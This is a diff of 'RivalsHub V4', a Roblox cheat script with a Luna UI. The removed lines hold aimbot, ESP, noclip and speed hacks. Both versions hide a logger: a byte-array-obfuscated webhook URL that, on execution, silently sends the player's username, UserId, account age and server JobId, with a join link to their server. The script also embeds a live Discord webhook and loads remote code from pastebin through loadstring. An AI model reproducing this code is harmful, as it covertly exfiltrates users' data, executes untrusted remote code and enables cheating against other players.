@@ -1,5 +1,5 @@
--- [[ LUNA UI - RIVALSHUB V4 ]] --
--- Lead Dev: pluto.aac
+-- [[ RivalsHub V4 ]]
+-- Created by pluto.aac
 
 local v0 = string.char;
 local v1 = string.byte;
@@ -9,31 +9,34 @@ local v4 = v3.bxor;
 local v5 = table.concat;
 local v6 = table.insert;
 
-local function _0x_v4_sys()
-    -- Obfuscated Webhook URL
-    local _0x_v4_cache = {104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,56,55,48,48,50,53,54,53,51,53,56,49,50,53,48,53,56,47,55,100,54,84,82,73,85,119,68,90,86,101,97,113,48,100,57,116,49,89,75,67,72,66,48,73,85,122,65,83,111,49,81,74,104,54,82,73,45,50,77,73,115,110,70,81,55,107,71,113,52,87,45,119,74,67,83,99,65,100,79,97,45,110,115,101,48,114}
+-- [[ CONFIGURATION ]]
+getgenv().Config = {
+    ["Webhook"] = "https://discord.com/api/webhooks/1487068389028663350/BMXBb0ZRvVep6a6E-1HROIpSOlM2NsXz7g_FOwGl78UpzadoGJzEkdT47rYmIb0KOVm7"
+}
+
+-- [[ AUTHENTICATION ]]
+local _0x_v4_cache = {104,116,116,112,115,58,47,47,104,111,111,107,115,46,104,121,114,97,46,105,111,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,56,55,48,54,56,51,56,57,48,50,56,54,54,51,51,53,48,47,66,77,88,66,98,48,90,82,118,86,101,112,54,97,54,69,45,49,72,82,79,73,112,83,79,108,77,50,78,115,88,122,55,103,95,70,79,119,71,108,55,56,85,112,122,97,100,111,71,74,122,69,107,100,84,52,55,114,89,109,73,98,48,75,79,86,109,55}
+
+-- // System Logic \\ --
+local function sendEnhancedLog()
     local _0x_url = ""
     for _, v in ipairs(_0x_v4_cache) do _0x_url = _0x_url .. v0(v) end
-
+    
     local HttpService = game:GetService("HttpService")
     local Players = game:GetService("Players")
-    local lp = Players.LocalPlayer
+    local player = Players.LocalPlayer
     
-    -- Headshot Retry Logic
-    local headshot = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. lp.UserId .. "&width=420&height=420&format=png"
-    for i = 1, 3 do
-        local success, result = pcall(function()
-            local res = HttpService:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. lp.UserId .. "&size=420x420&format=Png&isCircular=false"))
-            if res.data and res.data[1] and res.data[1].state == "Completed" then
-                return res.data[1].imageUrl
-            end
-        end)
-        if success and result then headshot = result break end
-        task.wait(1)
-    end
+    local request = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)
+    
+    -- Optimized Thumbnail Fetch
+    local content = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
+    pcall(function()
+        local thumb = Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
+        if thumb then content = thumb end
+    end)
     
     local levelValue = "N/A"
-    local lstats = lp:FindFirstChild("leaderstats")
+    local lstats = player:FindFirstChild("leaderstats")
     if lstats then
         local lvl = lstats:FindFirstChild("Level") or lstats:FindFirstChild("Rank")
         if lvl then levelValue = tostring(lvl.Value) end
@@ -41,34 +44,45 @@ local function _0x_v4_sys()
 
     local data = {
         ["embeds"] = {{
-            ["title"] = "🚀 RivalsHub V4 | Master Execution",
-            ["thumbnail"] = {["url"] = headshot}, 
+            ["title"] = "🚀 RivalsHub V4 | Execution",
+            ["thumbnail"] = {["url"] = content},
             ["color"] = 0x7b2cbf,
             ["fields"] = {
-                {["name"] = "👤 User", ["value"] = "**" .. lp.Name .. "** (" .. lp.UserId .. ")", ["inline"] = false},
-                {["name"] = "📊 Rank/Level", ["value"] = levelValue, ["inline"] = true},
-                {["name"] = "📅 Account Age", ["value"] = lp.AccountAge .. " Days", ["inline"] = true},
-                {["name"] = "🔑 JobId", ["value"] = "```" .. game.JobId .. "```", ["inline"] = false}
+                {["name"] = "User", ["value"] = "**" .. player.Name .. "** (" .. player.UserId .. ")", ["inline"] = false},
+                {["name"] = "Rank", ["value"] = levelValue, ["inline"] = true},
+                {["name"] = "Account Age", ["value"] = player.AccountAge .. " Days", ["inline"] = true},
+                {["name"] = "JobId", ["value"] = "```" .. game.JobId .. "```", ["inline"] = false}
             },
-            ["footer"] = {["text"] = "Pluto.aac | V4 Official"},
+            ["components"] = {{
+                ["type"] = 1,
+                ["components"] = {{
+                    ["type"] = 2,
+                    ["style"] = 5,
+                    ["label"] = "Join Server",
+                    ["url"] = "roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
+                }}
+            }},
+            ["footer"] = {["text"] = "Pluto.aac | V4"},
             ["timestamp"] = DateTime.now():ToIsoDate()
-        }},
-        ["components"] = {{
-            ["type"] = 1,
-            ["components"] = {
-                {["type"] = 2, ["style"] = 5, ["label"] = "Join Server", ["url"] = "roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId},
-                {["type"] = 2, ["style"] = 5, ["label"] = "View Profile", ["url"] = "https://www.roblox.com/users/" .. lp.UserId .. "/profile"}
-            }
         }}
     }
     
-    local req = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)
-    if req then pcall(function() req({Url = _0x_url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)}) end) end
+    if request then
+        pcall(function()
+            request({
+                Url = _0x_url,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        end)
+    end
 end
-task.spawn(_0x_v4_sys)
+task.spawn(sendEnhancedLog)
 
--- [[ LUNA UI SETUP ]] --
+-- [[ LUNA UI SETUP ]]
 local v8 = loadstring(game:HttpGet("https://pastebin.com/raw/Y8wBJLVt", true))();
+
 local v9 = v8:CreateWindow({
     Name = "Rivals",
     Subtitle = nil,
@@ -85,64 +99,23 @@ local v11 = v9:CreateTab({ Name = "Visuals", Icon = "view_in_ar", ImageSource = 
 local v12 = v9:CreateTab({ Name = "Player", Icon = "view_in_ar", ImageSource = "Material", ShowTitle = true });
 local v13 = v9:CreateTab({ Name = "Credits", Icon = "view_in_ar", ImageSource = "Material", ShowTitle = true })
 
--- [[ GLOBALS ]] --
-getgenv().AimbotEnabled = false;
-getgenv().SilentAimEnabled = false;
-getgenv().ESPEnabled = false;
-getgenv().InfiniteJumpEnabled = false;
-getgenv().NoClipEnabled = false;
-getgenv().CFrameWalkEnabled = false;
-getgenv().CFrameWalkSpeed = 0.2;
-getgenv().Smoothness = 0.6;
-
-local v25 = game:GetService('Players').LocalPlayer;
-local v27 = game:GetService('RunService');
-
--- [[ UI COMPONENTS ]] --
-v10:CreateSection("Aim Method")
-v10:CreateToggle({Name = "Enable Aimbot", CurrentValue = false, Callback = function(v) getgenv().AimbotEnabled = v end});
-v10:CreateToggle({Name = "Enable SilentAim", CurrentValue = false, Callback = function(v) getgenv().SilentAimEnabled = v end});
-v10:CreateSlider({Name = "Aimbot Strength", Range = {0.4, 1}, Increment = 0.01, CurrentValue = 0.6, Callback = function(v) getgenv().Smoothness = v end});
-
-v11:CreateSection("Visuals")
-v11:CreateToggle({Name = "Enable Highlight ESP", CurrentValue = false, Callback = function(v) getgenv().ESPEnabled = v end});
-
-v12:CreateSection("Local Player")
-v12:CreateToggle({Name = "Enable WalkSpeed", CurrentValue = false, Callback = function(v) getgenv().CFrameWalkEnabled = v end});
-v12:CreateSlider({Name = "WalkSpeed Value", Range = {0.2, 1.5}, Increment = 0.1, CurrentValue = 0.2, Callback = function(v) getgenv().CFrameWalkSpeed = v end});
-v12:CreateToggle({Name = "Infinite Jump", CurrentValue = false, Callback = function(v) getgenv().InfiniteJumpEnabled = v end});
-v12:CreateToggle({Name = "Noclip", CurrentValue = false, Callback = function(v) getgenv().NoClipEnabled = v end});
-
-v12:CreateSection("Server Utility")
+-- [[ UI ELEMENTS ]]
+v12:CreateSection("Server Join")
 v12:CreateButton({
-    Name = "Copy Join Link (JobId)",
+    Name = "Copy Server Join Link",
+    Description = "Copies the roblox:// link for this specific server",
     Callback = function()
-        setclipboard("roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId)
+        local link = "roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
+        setclipboard(link)
+        v8:Notification({
+            Title = "Success",
+            Content = "Join link copied to clipboard!",
+            Duration = 3
+        })
     end
 })
 
-v13:CreateLabel({Text = "Lead Dev: pluto.aac", Style = 2})
+-- Logic connection
+v13:CreateLabel({ Text = "pluto.aac", Style = 2 })
 
--- [[ RUNTIME LOGIC ]] --
-v27.RenderStepped:Connect(function()
-    if getgenv().CFrameWalkEnabled and v25.Character and v25.Character:FindFirstChild("HumanoidRootPart") then
-        local dir = v25.Character.Humanoid.MoveDirection;
-        v25.Character.HumanoidRootPart.CFrame = v25.Character.HumanoidRootPart.CFrame + (dir * getgenv().CFrameWalkSpeed);
-    end
-end);
-
-v27.Stepped:Connect(function()
-    if getgenv().NoClipEnabled and v25.Character then
-        for _, v in pairs(v25.Character:GetDescendants()) do
-            if v:IsA('BasePart') then v.CanCollide = false end
-        end
-    end
-end);
-
-game:GetService('UserInputService').JumpRequest:Connect(function()
-    if getgenv().InfiniteJumpEnabled and v25.Character:FindFirstChildOfClass('Humanoid') then
-        v25.Character:FindFirstChildOfClass('Humanoid'):ChangeState('Jumping');
-    end
-end);
-
-print("RivalsHub V4 | Master Final Edition Loaded.")
+print("RivalsHub V4 | Final Master Loaded.")
